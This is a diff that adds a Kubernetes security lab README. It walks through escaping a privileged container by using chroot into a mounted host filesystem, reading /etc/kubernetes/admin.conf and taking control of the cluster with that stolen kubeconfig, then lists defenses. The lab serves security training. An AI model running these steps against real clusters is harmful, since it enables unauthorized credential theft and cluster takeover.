@@ -1,0 +1,163 @@
+⎈ Container Escape to Host System – Hands-On Lab
+🙌 Overview
+
+This lab demonstrates one of the most dangerous but commonly seen Kubernetes security failures: privileged containers with host access.
+When containers are granted permissions beyond what they require, they can escape their isolation boundary and gain control over the host node and eventually the entire cluster.
+
+In this scenario, you will:
+
+Escape from a container to the host filesystem
+
+Gain node-level privileges
+
+Access Kubernetes administrative configuration
+
+Use it to interact with the cluster with elevated privileges
+
+🎯 Learning Objectives
+
+By the end of this lab, you will be able to:
+
+Exploit a misconfigured privileged container
+
+Escape container isolation using host mounts
+
+Access the host node filesystem
+
+Obtain Kubernetes kubeconfig from the node
+
+Query and control Kubernetes using stolen credentials
+
+Understand the real-world security impact
+
+⚡️ Scenario
+
+Monitoring, debugging, and system-level tooling sometimes requires elevated privileges.
+However, when such workloads are deployed insecurely (privileged + host mounts), they expose the host system and the cluster.
+
+In this lab you will:
+1️⃣ Exploit a privileged pod
+2️⃣ Break into the host filesystem
+3️⃣ Access node kubeconfig
+4️⃣ Control the cluster
+
+🎯 Lab Goal
+
+Escape out of the running container
+
+Gain access to the host system
+
+Obtain kubeconfig from:
+
+/etc/kubernetes/admin.conf
+
+
+Use it to query and control the cluster
+
+🧪 Step-By-Step Walkthrough
+1️⃣ Identify Privileges
+
+Check container capabilities and privileges:
+
+capsh --print
+mount
+
+
+
+2️⃣ Verify Host Filesystem is Mounted
+
+List the mounted host filesystem:
+
+ls /host-system/
+
+
+If you see directories like /bin, /etc, /var, /lib, /root,
+this means the node filesystem is mounted inside the pod 🔥
+
+3️⃣ Escape Into Host Filesystem
+
+Use chroot to switch root filesystem to host:
+
+chroot /host-system bash
+
+
+Now your shell root / is the node filesystem.
+
+Verify:
+
+whoami
+hostname
+ls /
+
+
+You are still inside the pod namespaces,
+but now you control the node disk — which is already a critical compromise.
+
+4️⃣ Inspect Running Pods From the Host Runtime
+crictl pods
+
+
+This confirms visibility into node runtime workloads.
+
+5️⃣ Access Kubernetes Admin Credentials
+
+On most Kubernetes clusters, node admin credentials exist here:
+
+cat /etc/kubernetes/admin.conf
+
+
+This file gives HIGH privilege access.
+
+6️⃣ Use kubeconfig to Control Cluster
+
+List cluster system resources:
+
+kubectl --kubeconfig /etc/kubernetes/admin.conf get all -n kube-system
+
+
+List nodes:
+
+kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes
+
+
+🎉 Congratulations — you now have cluster-level control using credentials stolen from the node.
+
+From here, lateral movement and post-exploitation becomes possible depending on environment.
+
+🧠 What You Just Proved
+
+Privileged containers + host mounts = 🚨 critical risk
+
+Container escape does NOT always require kernel exploits
+
+Host access → Kubernetes control plane access
+
+Real-world attackers abuse this exact path
+
+🔐 Key Defenses
+
+To prevent this class of attack:
+
+❌ Avoid privileged pods
+
+❌ Do not mount / or sensitive host paths
+
+❌ Avoid hostPID / hostNetwork / hostIPC unless absolutely required
+
+✔ Enforce Pod Security Admission or OPA
+
+✔ Use runtime security tools (Falco, eBPF, Defender, etc.)
+
+✔ Monitor for hostPath usage
+
+✔ Separate control-plane and workload nodes
+
+✔ Rotate kubeconfig credentials
+
+🔖 References
+
+Misuse of Linux capabilities in containers
+
+Privileged vs unprivileged container exploitation
+
+Hardening Linux container environments
